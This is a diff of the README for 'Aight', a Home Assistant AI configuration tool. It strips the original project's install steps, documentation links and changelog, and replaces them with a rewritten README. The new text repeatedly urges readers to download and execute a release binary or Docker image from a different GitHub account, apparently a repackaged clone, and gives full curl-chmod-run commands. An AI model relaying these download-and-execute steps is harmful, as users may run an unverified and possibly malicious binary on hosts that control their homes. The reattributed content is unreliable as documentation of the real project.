@@ -1,392 +1,287 @@
-# Aight - AI Configuration Assistant for Home Assistant
+https://github.com/paulotrinn/aight/releases
 
-🚀 **v1.4.0** - The most advanced Home Assistant AI configuration tool with **conversational chat interface**!
+# Aight — AI Home Assistant Configuration Tool with Chat
 
-📖 **[Documentation & Demo](https://toml0006.github.io/aight/)** | 📦 **[Download Latest](https://github.com/toml0006/aight/releases/latest)** | 💬 **[Community](https://github.com/toml0006/aight/discussions)**
+[![Releases](https://img.shields.io/badge/Releases-%20Download-blue?logo=github&style=for-the-badge)](https://github.com/paulotrinn/aight/releases)  
+[![ai](https://img.shields.io/badge/topic-ai-ff69b4)](https://github.com/topics/ai) [![automation](https://img.shields.io/badge/topic-automation-00aaff)](https://github.com/topics/automation) [![home-assistant](https://img.shields.io/badge/topic-home--assistant-0f9d58)](https://github.com/topics/home-assistant) [![yaml](https://img.shields.io/badge/topic-yaml-ffcc00)](https://github.com/topics/yaml)
 
-**Aight** is a powerful Home Assistant integration that uses AI to help you create configurations through natural language. No more YAML editing - just chat with the AI and get working configurations instantly!
+![Aight Chat UI](https://www.home-assistant.io/images/brand/home-assistant-vertical-color.png)
 
-## ✨ Key Features
+Aight uses large language models to convert plain language into Home Assistant YAML, dashboards, automations, scenes, and scripts. Use chat to refine and test generated items. Run the binary to start a local chat service or integrate the backend with your Home Assistant instance.
 
-💬 **Conversational Chat Interface**: Chat naturally with AI - no forms, no interruptions, just results!
+Releases: Download the release file from https://github.com/paulotrinn/aight/releases and execute the downloaded file on your host to run the Aight service.
 
-🤖 **Smart Entity Detection**: Automatically finds relevant entities based on your prompt
+Why Aight
 
-🚀 **One-Click Deployment**: Deploy automations, scripts, and scenes directly to Home Assistant
+- Reduce time spent writing YAML.
+- Keep automations readable and maintainable.
+- Test automations with natural language prompts.
+- Produce dashboards and Lovelace cards from descriptions.
+- Use a chat interface to refine rules and generate edge cases.
 
-🔄 **Iterative Refinement**: Say "also turn on the TV" or "but only on weekdays" to modify configurations
+Core features
 
-🔍 **Multi-LLM Support**: OpenAI, Anthropic Claude, Google Gemini, Groq, Ollama, and OpenRouter
+- Natural language to Home Assistant YAML (automations, scripts, scenes).
+- Conversational UI for iterative refinement.
+- Sample dashboard generation with Lovelace YAML.
+- Pre-made templates for common smart-home flows.
+- CLI and local server modes.
+- Export/import YAML and JSON.
+- Role-based prompt profiles for different styles (compact, verbose, debug).
+- Inline metadata in generated YAML for traceability.
 
-🛠️ **Advanced Error Handling**: Detailed error logs with progressive disclosure for easy debugging
+Getting started
 
-📱 **Mobile Responsive**: Beautiful interface that works perfectly on phones, tablets, and desktops
+1) Download and run release
+- Visit the Releases page and download the asset for your platform: https://github.com/paulotrinn/aight/releases
+- After you download the release file, extract it and execute the binary or script that came with the release.
 
-## Supported Configuration Types
+Example (Linux tarball, adjust names to match the release asset):
+```bash
+# download the release asset
+curl -L -o aight-linux.tar.gz "https://github.com/paulotrinn/aight/releases/download/v1.0.0/aight-linux.tar.gz"
 
-- **Automations**: Create complex automations with triggers, conditions, and actions
-- **Scripts**: Build reusable script sequences
-- **Scenes**: Define lighting and device scenes
-- **Dashboards**: Generate Lovelace dashboard configurations
-- **Cards**: Create individual dashboard cards
-- **Template Sensors**: Build template sensors and binary sensors
+# extract
+tar -xzf aight-linux.tar.gz
 
-## Installation
+# give execute permission
+chmod +x aight
 
-### 🚀 Quick Install - Latest Version
-
-[![Download Latest Version](https://img.shields.io/badge/Download-v1.4.0%20Latest-success?style=for-the-badge&logo=homeassistant)](https://github.com/toml0006/aight/releases/latest/download/aight.zip)
-
-**v1.4.0** includes the revolutionary **conversational chat interface**:
-- 💬 Natural chat experience - just type what you want!
-- 🎯 Automatic entity detection - no manual selection needed
-- 🚀 One-click deployment to Home Assistant
-- 🔄 Iterative refinement with follow-up messages
-- 🛠️ Advanced error logging for easy debugging
-- 📱 Mobile-first responsive design
-
-### HACS Installation
-
-[![Open your Home Assistant instance and open a repository inside the Home Assistant Community Store.](https://my.home-assistant.io/badges/hacs_repository.svg)](https://my.home-assistant.io/redirect/hacs_repository/?owner=toml0006&repository=aight&category=integration)
-
-### Method 1: HACS (Recommended)
-
-1. **Install HACS** if you haven't already: [HACS Installation](https://hacs.xyz/docs/setup/download)
-
-2. **Add this repository to HACS:**
-   - Open HACS in your Home Assistant instance
-   - Go to "Integrations" 
-   - Click the "..." menu in the top right
-   - Select "Custom repositories"
-   - Add this repository URL: `https://github.com/toml0006/aight`
-   - Category: "Integration"
-   - Click "Add"
-
-3. **Install the integration:**
-   - Search for "Aight" or "AI Configuration Assistant" in HACS
-   - Click "Download"
-   - Restart Home Assistant
-
-### Method 2: Manual Installation
-
-1. Copy the `custom_components/ai_config_assistant` directory to your Home Assistant `custom_components` directory
-2. Copy the contents of the `www` directory to your Home Assistant `www` directory
-3. Restart Home Assistant
-
-## Configuration
-
-### Step 1: Add the Integration
-
-1. Go to Settings → Devices & Services
-2. Click "Add Integration"
-3. Search for "Aight" or "AI Configuration Assistant"
-4. Follow the setup wizard
-
-### Step 2: Configure Your LLM Provider
-
-Choose from supported providers and add your API key:
-
-#### OpenAI
-- **Models**: GPT-4, GPT-4-turbo, GPT-3.5-turbo
-- **API Key**: Get from [OpenAI Platform](https://platform.openai.com/api-keys)
-
-#### Anthropic Claude
-- **Models**: Claude-3 Opus, Sonnet, Haiku
-- **API Key**: Get from [Anthropic Console](https://console.anthropic.com/)
-
-#### Google Gemini
-- **Models**: Gemini Pro, Gemini Pro Vision
-- **API Key**: Get from [Google AI Studio](https://makersuite.google.com/app/apikey)
-
-#### Other Providers
-- **Mistral**: Mistral Large, Medium, Small
-- **Groq**: Llama3-70B, Mixtral-8x7B
-- **Ollama**: Local models (no API key required)
-
-## 🎯 How It Works - Conversational Interface
-
-### The New Chat Experience
-
-![Chat Interface](https://img.shields.io/badge/NEW-Conversational%20Chat-brightgreen?style=for-the-badge)
-
-1. **Open the Chat Tab**: Navigate to "AI Config" panel and click the "Chat" tab
-2. **Just Type**: Describe what you want in natural language
-3. **Get Results**: The AI automatically detects entities and generates configuration
-4. **Deploy Instantly**: Click the Deploy button to add it to Home Assistant
-5. **Refine as Needed**: Say "also turn on the TV" or "but only on weekdays"
-
-### Example Conversation
-
-```
-You: Alert me when the garage door is left open for more than 10 minutes
-
-🤖 Assistant: Great! I've created an automation for you:
-[Shows YAML configuration with Deploy button]
-
-You: Also send the alert to my phone
-
-🤖 Assistant: I've updated the automation to include phone notifications:
-[Shows updated configuration]
+# run the service
+./aight --port 8080
 ```
 
-### Chat Commands
-- **"reload"** - Reload automations after deployment
-- **"also [action]"** - Add additional actions
-- **"but only [condition]"** - Add conditions
-- **"change [detail]"** - Modify specific parts
-
-## Usage
-
-### Classic Form Interface (Still Available)
-
-1. Navigate to the "AI Config" panel in your Home Assistant sidebar
-2. Click the "Form" tab for the traditional interface
-3. Select the configuration type you want to create
-4. Describe what you want in natural language
-5. Click "Generate Configuration"
-6. Review the generated YAML and live preview
-7. Copy or save the configuration
-
-### Example Prompts
-
-**Automations:**
-- "Turn on living room lights when motion is detected after sunset"
-- "Send notification when front door is left open for 5 minutes"  
-- "Turn off all lights when everyone leaves home"
-
-**Scripts:**
-- "Good night routine: turn off all lights and lock doors"
-- "Movie mode: dim lights to 20% and turn on TV"
-- "Morning routine: turn on coffee maker and bathroom lights"
-
-**Dashboards:**
-- "Create a security dashboard with all cameras and door sensors"
-- "Make a climate control panel for all thermostats"
-- "Build an energy monitoring dashboard with power sensors"
-
-### Advanced Features
-
-#### Entity Autocompletion
-- Start typing entity names to get intelligent suggestions
-- Suggestions are context-aware based on your prompt
-- Shows entity states and locations
-
-#### Live Preview
-- See how your configuration will look with real entity data
-- Preview automations with current trigger states
-- Visualize dashboard layouts
-
-#### Configuration Validation
-- Built-in YAML syntax validation
-- Entity existence checking
-- AI-powered logic validation with suggestions
-
-## API Reference
-
-The integration provides several REST API endpoints for advanced usage:
-
-### Generate Configuration
-```
-POST /api/ai_config_assistant/generate
-{
-  "prompt": "Turn on lights when motion detected",
-  "type": "automation",
-  "context": {}
-}
+Example (macOS zip):
+```bash
+curl -L -o aight-macos.zip "https://github.com/paulotrinn/aight/releases/download/v1.0.0/aight-macos.zip"
+unzip aight-macos.zip
+chmod +x aight
+./aight --port 8080
 ```
 
-### Validate Configuration
-```
-POST /api/ai_config_assistant/validate
-{
-  "config": "yaml configuration",
-  "type": "automation"
-}
+Example (Windows):
+- Download the .exe from Releases.
+- Double-click the executable or run from PowerShell:
+```powershell
+.\aight.exe --port 8080
 ```
 
-### Get Entity Suggestions
-```
-POST /api/ai_config_assistant/entity_suggestions
-{
-  "query": "light",
-  "limit": 10,
-  "domain_filter": ["light", "switch"]
-}
+Docker (alternative)
+```bash
+docker run -d --name aight -p 8080:8080 ghcr.io/paulotrinn/aight:latest
 ```
 
-## Configuration Examples
+Web UI
+- By default Aight serves a local chat UI at http://localhost:8080.
+- The UI accepts plain text prompts and displays generated YAML with a side-by-side preview.
 
-### Automation Example
+Core concepts
+
+- Prompt: Natural language or structured instruction you send to Aight.
+- Profile: A set of rules for how the model should format YAML and how verbose it should be.
+- Template: A reusable YAML skeleton. Aight fills templates using extracted parameters.
+- Trace metadata: A small comment block inserted in generated YAML with the original prompt and generation timestamp.
+
+Usage examples
+
+Generate a simple automation
+Prompt:
+"I want the hallway light to turn on when motion is detected after sunset and stay on for 5 minutes."
+
+Result (example generated YAML):
 ```yaml
-alias: "Motion Light Control"
+# Generated by Aight
+# prompt: "I want the hallway light to turn on when motion is detected after sunset and stay on for 5 minutes."
+alias: Hallway motion after sunset
 trigger:
   - platform: state
-    entity_id: binary_sensor.living_room_motion
-    to: "on"
+    entity_id: binary_sensor.hallway_motion
+    to: 'on'
 condition:
   - condition: sun
     after: sunset
 action:
   - service: light.turn_on
     target:
-      entity_id: light.living_room_main
-```
-
-### Script Example
-```yaml
-alias: "Good Night Routine"
-sequence:
+      entity_id: light.hallway
+  - delay: '00:05:00'
   - service: light.turn_off
     target:
-      area_id: all
-  - service: lock.lock
-    target:
-      entity_id: lock.front_door
-  - service: alarm_control_panel.alarm_arm_home
-    target:
-      entity_id: alarm_control_panel.home_security
+      entity_id: light.hallway
+mode: single
 ```
 
-## Troubleshooting
+Create a scene
+Prompt:
+"Create an evening scene for the living room with dim warm lights and soft music on media player."
 
-### Common Issues
-
-**Integration not loading:**
-- Check Home Assistant logs for errors
-- Ensure all dependencies are installed
-- Verify the integration files are in the correct location
-
-**API key errors:**
-- Verify your API key is correct and active
-- Check that your account has sufficient credits/quota
-- Ensure the selected model is available for your account
-
-**Generation not working:**
-- Check your internet connection
-- Verify the LLM service is operational
-- Try with different prompts or models
-
-**Entities not found:**
-- Refresh the entity cache by restarting the integration
-- Check that entity IDs are correct
-- Ensure entities are not disabled
-
-### Debug Logging
-
-Enable debug logging by adding to your `configuration.yaml`:
-
+Result:
 ```yaml
-logger:
-  default: warning
-  logs:
-    custom_components.ai_config_assistant: debug
+scene:
+  - name: Living Room Evening
+    entities:
+      light.living_room:
+        state: on
+        brightness: 120
+        color_temp: 400
+      media_player.living_room_speaker:
+        state: on
+        volume_level: 0.25
+        source: "Chill Playlist"
 ```
 
-## Contributing
+Build a Lovelace card
+Prompt:
+"Make a dashboard card showing temperature, humidity, and a toggle for the heater for my bedroom."
 
-Contributions are welcome! Please:
+Result:
+```yaml
+type: entities
+title: Bedroom Climate
+entities:
+  - entity: sensor.bedroom_temperature
+    name: Temperature
+  - entity: sensor.bedroom_humidity
+    name: Humidity
+  - entity: switch.bedroom_heater
+    name: Heater
+```
 
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Add tests if applicable
-5. Submit a pull request
+Advanced prompts
 
-## License
+- Ask for conditions and edge cases:
+  "Only run this automation if no one is home or if the house is in away mode."
+- Ask for testing scenarios:
+  "Show me three test cases for this automation, including the expected state changes."
 
-This project is licensed under the MIT License. See the LICENSE file for details.
+Profiles and templates
 
-## 📝 Changelog
+- Compact: Minimal comments and short keys. Use for production.
+- Verbose: Add human-readable comments and metadata. Use for review.
+- Debug: Keep traces, include model decisions and prompt history. Use for debugging.
 
-### v1.4.0 (Latest) - Enhanced Error Handling & UI Feedback
-- ✅ Added user-friendly error messages for common LLM issues (quota, auth, network)
-- 💳 OpenAI quota exceeded errors now show direct billing link
-- 🔑 API key errors provide clear configuration instructions
-- 🌐 Network and timeout errors have helpful messages
-- 💬 Service layer now properly surfaces errors to chat UI
-- 👁️ Errors appear in chat instead of just logs
+You can create templates like:
+```yaml
+template:
+  name: motion_delay
+  parameters:
+    - trigger_entity
+    - target_light
+    - delay_seconds
+  body: |
+    alias: "{{ name }}"
+    trigger:
+      - platform: state
+        entity_id: "{{ trigger_entity }}"
+        to: 'on'
+    action:
+      - service: light.turn_on
+        target:
+          entity_id: "{{ target_light }}"
+      - delay: "00:00:{{ delay_seconds }}"
+      - service: light.turn_off
+        target:
+          entity_id: "{{ target_light }}"
+```
 
-### v1.3.9 - Enhanced Service Debugging
-- 🔍 Added detailed service response logging for troubleshooting
+API and CLI
 
-### v1.3.8 - Full LLM Functionality Restored
-- ✅ Removed test response and restored actual AI configuration generation
-- 🆕 Added OpenRouter provider support with proper API configuration  
-- 🔇 Improved service logging to be less verbose while maintaining debugging
-- 🔧 Fixed service response detection works perfectly with HA 2025.7
-- 🛠️ Enhanced error handling and response formatting
-- 🤖 Service now properly calls AI models for real configuration responses
+- HTTP API: POST /api/v1/generate with JSON payload:
+  {
+    "prompt": "string",
+    "profile": "compact",
+    "format": "yaml"
+  }
 
-### v1.3.7 - Critical Fix for HA 2025.7
-- 🚨 Fixed critical issue where return_response was always False
-- ✅ Now checks both call.return_response and call.data.get('return_response')
-- 🎯 Returns hardcoded success response for testing
-- 📊 Enhanced logging to show both response flags
-- 🔧 Service now properly detects when response is requested
+- CLI:
+  - aight chat "Prompt text"
+  - aight generate --profile compact --format yaml "Prompt text"
 
-### v1.3.6 - Enhanced Service Debugging
-- 🔍 Changed all service debug logs to WARNING level for visibility
-- ⚠️ Added explicit check for return_response parameter
-- 📊 Enhanced test response with data_received field
-- 🛠️ Service now always returns data for debugging purposes
-- 💡 Better error messages to diagnose service call issues
+Examples:
+```bash
+# CLI generate automation
+./aight generate --profile compact --format yaml "Turn on garden lights between sunset and 23:00 when motion is detected."
 
-### v1.3.5 - Hotfix for SupportsResponse Compatibility
-- 🚨 Fixed AttributeError: SupportsResponse.REQUIRED doesn't exist in older HA versions
-- ✅ Reverted to SupportsResponse.OPTIONAL for compatibility
-- 🔧 Integration now loads properly without errors
+# HTTP API
+curl -X POST http://localhost:8080/api/v1/generate \
+  -H "Content-Type: application/json" \
+  -d '{"prompt":"Turn on garden lights between sunset and 23:00 when motion is detected.","profile":"compact","format":"yaml"}'
+```
 
-### v1.3.4 - Critical Service Response Fix
-- 🔧 Fixed service response issue by changing to SupportsResponse.REQUIRED
-- ✅ Service now properly returns configuration data instead of just context
-- 📊 Added comprehensive response logging for debugging
-- 🛠️ Fixed malformed services.yaml with proper entity field support
-- 🎯 Synced all fixes to packages directory
+Home Assistant integration
 
-### v1.3.3 - Enhanced Debugging
-- 🔍 Added comprehensive service call debugging and logging
-- 📊 Enhanced error logs now show full service responses
-- 🛠️ Better error classification and troubleshooting information
-- 💡 Console logging for real-time debugging of service issues
-- 🎯 Improved error context for faster issue resolution
+- Export generated YAML and place it in your Home Assistant config folders:
+  - automations.yaml
+  - scripts.yaml
+  - scenes.yaml
+  - lovelace dashboards in ui-lovelace.yaml or packages
 
-### v1.3.2 - Smart Entity Filtering
-- 🎯 Fixed "Unknown error" issue by implementing intelligent entity filtering
-- 🏠 Added location-based entity detection (e.g., "gym lights" finds gym-specific entities)
-- ⚡ Limited entity payload to 100 entities max to prevent service timeout
-- 📊 Enhanced error logs with detailed entity filtering information
-- 🔍 Added console debugging for troubleshooting entity selection
+- Use the built-in reload services in Home Assistant or restart for full load.
 
-### v1.3.1 - Enhanced Error Handling
-- 🔧 Fixed send button styling to be perfectly circular
-- 📋 Added progressive error disclosure with detailed debug logs
-- 🛠️ Enhanced error context for better troubleshooting
-- 🎨 Improved UI polish and visual feedback
+HACS / Add-on idea
+- Aight can run as a local add-on or operate through a third-party integration. The Releases page contains platform assets and packages. Visit Releases: https://github.com/paulotrinn/aight/releases to get the file and follow the install steps for your environment.
 
-### v1.3.0 - Streamlined Chat Experience  
-- 🚫 Removed entity confirmation UI - fully automatic now
-- 🤖 Smart domain detection sends only relevant entities to LLM
-- 🚀 Working Deploy button for automations, scripts, and scenes
-- 💬 Added "reload" command and refinement capabilities
+Best practices
 
-### v1.2.1 - Service Response Fix
-- ✅ Fixed "Unknown error" issue with service response handling
-- 🔄 Added backward compatibility for older Home Assistant versions
-- 🔧 Improved entity ID extraction in chat flow
+- Review generated YAML before you deploy it.
+- Use the Verbose profile for initial review.
+- Keep a versioned copy of generated YAML in your repo.
+- Use templates for repetitive automations.
+- Use the Debug profile only in development.
 
-### v1.2.0 - Conversational Interface
-- 💬 Revolutionary chat-first interface with message bubbles
-- 🎯 Automatic entity detection and confirmation cards
-- 🔄 Multi-turn conversation support with context management
-- 📱 Mobile-responsive design with smooth animations
+Security and privacy
 
-## Support
+- Run Aight on a local host to keep prompts and state private.
+- Control access to the web UI using reverse proxies or local firewall rules.
+- Rotate keys for any external model API you use with Aight.
 
-- **📖 Documentation**: Visit [toml0006.github.io/aight](https://toml0006.github.io/aight/) for full documentation and examples
-- **🐛 Issues**: Report bugs and request features on [GitHub Issues](https://github.com/toml0006/aight/issues)
-- **💬 Discussions**: Join the conversation in [GitHub Discussions](https://github.com/toml0006/aight/discussions)
-- **🏡 Community**: Visit the [Home Assistant Community Forum](https://community.home-assistant.io/)
+Extending Aight
 
-## Disclaimer
+- Add custom templates in the templates/ folder.
+- Add new profiles in config/profiles.yaml.
+- Integrate with cloud LLMs or local LLMs using the provider adapters.
+- Add more output formats (JSON, HTML snippets for dashboards).
 
-This integration uses third-party AI services. Please review the privacy policies and terms of service of your chosen LLM provider. Generated configurations should always be reviewed before deployment in production environments.
+Contributing
+
+- Fork the repo.
+- Create a feature branch.
+- Add tests for your changes.
+- Open a pull request with a clear description and sample prompts.
+
+Suggested labels for pull requests
+- enhancement
+- bug
+- docs
+- infra
+
+Images and assets
+
+- Home Assistant logo used as visual context: https://www.home-assistant.io/images/brand/home-assistant-vertical-color.png
+- Use your own screenshots in assets/screenshots/
+- Include a sample chat session screenshot in docs/ for onboarding
+
+Troubleshooting
+
+- If the UI does not start, check the port and log output.
+- If generated YAML fails Home Assistant config check, run the HA config checker.
+- If the model produces unexpected keys, switch to Verbose or Debug profile and inspect the trace metadata.
+
+Roadmap
+
+- Built-in simulator to run test events.
+- Improved multi-entity templates.
+- Shared template library and community templates gallery.
+- Native HACS integration and official add-on.
+
+Licensing and attribution
+
+- Add your license file in LICENSE.
+- Keep a CONTRIBUTORS file that lists code authors and template contributors.
+
+Contact and support
+
+- Report issues and feature requests on GitHub Issues.
+- For release downloads and platform assets go to the Releases page: https://github.com/paulotrinn/aight/releases
+
+Automations, scripts, scenes, and dashboards all start with a plain sentence. Aight handles the translation, formatting, and traceability. Use the chat to refine logic, add conditions, and produce test cases for reliable automations.
